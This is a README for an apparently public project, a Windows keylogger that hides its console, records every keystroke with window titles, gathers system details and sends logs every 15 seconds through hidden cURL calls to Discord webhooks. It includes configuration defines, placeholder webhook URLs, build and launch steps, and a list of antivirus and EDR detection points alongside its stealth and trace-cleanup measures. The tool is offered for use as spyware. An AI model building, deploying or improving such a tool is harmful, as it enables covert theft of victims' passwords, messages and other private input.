# Windows Keylogger with Discord Exfiltration

Advanced keystroke logger for Windows with real-time data exfiltration via Discord webhooks.

---

## Overview

This project implements a low-level keyboard hook for Windows that captures keystrokes and exfiltrates data to Discord webhooks using formatted embeds. It includes comprehensive system information gathering, session management, and stealth capabilities.

---

## Features

### Keystroke Capture

- Global low-level keyboard hook (`WH_KEYBOARD_LL`)
- Active window detection with title and timestamp
- Special key mapping (Shift, Ctrl, Alt, Win, etc.)
- Configurable output format (readable, decimal, hexadecimal)
- Case handling (Caps Lock, Shift)
- Hourly log file rotation

### Data Exfiltration

- Periodic transmission via cURL (configurable, default: 15 seconds)
- Hidden cURL execution (no window)
- 4 distinct Discord webhooks (info, connection, logs, deactivation)
- Discord embeds with images, avatars, and structured fields
- Memory buffer for keystroke accumulation
- Complete log file attachment

### System Information Gathering

On startup, sends metadata:
- TARGET ID (generated from local IP)
- MACHINE (computer name)
- USER (Windows username)
- IP ADDRESS (local IP address)
- SYSTEM (Windows version: 7/8/10+, architecture 32/64-bit)
- PROCESSOR (AMD64, ARM, IA64, x86)
- MEMORY (total and available RAM in GB)
- DISK SPACE (C: drive total and free space)

### Session Management

- Connection message on startup (hook installed)
- Deactivation message on shutdown
- Handler for forced interruption (Ctrl+C, window close)
- Final logs sent before termination
- Automatic temporary file cleanup

### Advanced Features

- Console automatically hidden on startup
- Windows subsystem (no visible console)
- Boot wait if system is in boot phase (bootwait)
- Temporary file tracking and management
- JSON escaping for special characters
- ISO 8601 timestamping for all events

---

## Architecture

### Technical Stack

- **Language**: C++ (Windows API)
- **Platform**: Windows x64
- **IDE**: Visual Studio (Release)
- **Subsystem**: Windows (`/SUBSYSTEM:windows /ENTRY:mainCRTStartup`)
- **Libraries**: ws2_32, iphlpapi, psapi, shell32, ole32
- **External dependency**: cURL (executed via CreateProcess)

### Data Flow

```
Keyboard Hook → Key Mapping → Memory Buffer → Log File (hourly)
                                                        ↓
                                              Hidden cURL → Discord Webhook
                                                        ↓
                                              Embed + File Attachment
```

### Code Structure

- `executeCurlHidden()`: Hidden cURL execution
- `HookCallback()`: Keyboard interception callback
- `Save()`: Keystroke processing and formatting
- `sendInfoMessage()`: System info on startup
- `sendConnexionMessage()`: Connection notification
- `sendLogMessage()`: Log transmission (embed + file)
- `sendExitMessage()`: Deactivation notification
- `consoleHandler()`: Forced interruption handling
- `cleanupTempFiles()`: Temporary file deletion

---

## Configuration

### Modifiable Parameters

Modify these constants at the top of the source file (`KEYLOGGER.cpp`, lines 69-73):

```cpp
#define visible        // Visible console (commented by default)
// #define invisible   // Hidden console (activated in main)
#define bootwait       // Wait if system is booting
#define FORMAT 0       // 0 = readable; 10 = decimal; 16 = hexadecimal
#define mouseignore    // Ignore mouse clicks
#define SEND_INTERVAL_SECONDS 15  // Send interval in seconds
```

### Discord Webhooks

Replace URLs with your own webhooks (lines 63-66):

```cpp
#define WEBHOOK_INFO "https://discord.com/api/webhooks/YOUR_WEBHOOK_INFO"
#define WEBHOOK_CONNEXION "https://discord.com/api/webhooks/YOUR_WEBHOOK_CONNEXION"
#define WEBHOOK_LOGS "https://discord.com/api/webhooks/YOUR_WEBHOOK_LOGS"
#define WEBHOOK_DESACTIVATION "https://discord.com/api/webhooks/YOUR_WEBHOOK_DESACTIVATION"
```

**Important**: Never publish your webhooks in plain text in a public repository.

---

## Installation

### Prerequisites

- Windows 7/8/10/11 (x64)
- Visual Studio 2019 or higher
- Windows SDK
- cURL (must be in system PATH)

### Compilation

1. Create a C++ console project in Visual Studio
2. Add `KEYLOGGER.cpp` to source files
3. Configure: Release / x64
4. Libraries are already linked via `#pragma comment` (lines 56-60)
5. Build → Build Solution (Ctrl+Shift+B)
6. Executable will be generated in `x64/Release/`

### cURL Verification

```bash
curl --version
```

If cURL is not installed, download it from [curl.se](https://curl.se/windows/) and add it to PATH.

---

## Usage

### Launch

```bash
KEYLOGGER.exe
```

The program:
1. Immediately hides the console
2. Creates `logs/` directory if needed
3. Sends system information
4. Sends connection notification
5. Installs keyboard hook
6. Starts monitoring

### Behavior

- **Active monitoring**: Captures all keystrokes
- **Buffer**: Accumulates keystrokes in memory
- **Periodic sending**: Transmits logs every 15 seconds (configurable)
- **Log rotation**: New log file every hour
- **Clean shutdown**: atexit handler for normal termination

### Termination

- **Normal**: Shutdown with final logs + deactivation notification
- **Forced (Ctrl+C)**: Handler detects, sends notification, cleans up
- **Window close**: Same process as Ctrl+C

### Generated File Structure

```
KEYLOGGER.exe
├── logs/
│   ├── 2025-12-11__17-05-42.log           # Timestamped log
│   ├── log_TARGET_192_168_1_1_xxx.txt     # Transmitted logs
│   └── log_TARGET_192_168_1_1_FINAL_xxx.txt # Final logs
└── temp_*.json                             # Temporary files (auto-deleted)
    ├── temp_info.json
    ├── temp_connexion.json
    ├── temp_log_embed.json
    └── temp_exit.json
```

---

## Data Structure

### Log Format

Logs include context for each keystroke:

```
[Window: Window Name - at 2025-12-11T17:05:42] 
typed text here with special keys [SHIFT][ENTER]

[Window: Other Window - at 2025-12-11T17:06:15]
other text...
```

### Discord Embeds

The program uses rich embeds with:
- Title and description
- Image and avatar URLs
- Structured fields (inline or block)
- ISO 8601 timestamp
- Footer with protocol information
- Custom color (white for active, blue for deactivation)

### Discord Messages

1. **WEBHOOK_INFO**: Complete system information
2. **WEBHOOK_CONNEXION**: Hook installed notification
3. **WEBHOOK_LOGS**: Embed + log file attachment
4. **WEBHOOK_DESACTIVATION**: Termination notification + cleanup

---

## Security and Limitations

### Technical Limitations

- Windows only (Windows-specific APIs)
- cURL dependency (must be installed)
- Can be detected by antivirus (keyboard hook)
- Requires sufficient privileges for hook installation
- Local IP only (no public IP)

### Detection

This program can be detected by:
- Antivirus (heuristic signature for keyboard hook)
- EDR (Endpoint Detection and Response)
- Behavioral analysis (hidden CreateProcess)
- System hook monitoring (WH_KEYBOARD_LL)

### Implemented Measures

- Temporary files auto-deleted
- No persistence (does not install on startup)
- HTTPS transmission via cURL
- Console hidden by default
- Trace cleanup on shutdown

---

## Screenshots

### 1
![1](https://github.com/Mateobro33/discord-keylogger/blob/b9cb58d63db688bc510de2eee0364a737c053bd5/Capture%20d%E2%80%99%C3%A9cran%202025-12-11%20170542.png)

### 2
![2](https://github.com/Mateobro33/discord-keylogger/blob/9afc8252f84fd6ee886053e2d32fc0dae3bad97f/Capture%20d%E2%80%99%C3%A9cran%202025-12-11%20170430.png)

### 3
![3](https://github.com/Mateobro33/discord-keylogger/blob/0efb1fcc9b54fe5590105f5864dd9c5eaea831f0/Capture%20d%E2%80%99%C3%A9cran%202025-12-11%20170629.png)

---

## Resources

- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Low-Level Keyboard Hooks](https://docs.microsoft.com/en-us/windows/win32/inputdev/low-level-keyboard-hooks)
- [SetWindowsHookEx Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
- [Discord Webhooks Guide](https://discord.com/developers/docs/resources/webhook)
- [OWASP Keylogger Analysis](https://owasp.org/www-community/attacks/Keylogger)

---

## Version

Version: 4.1
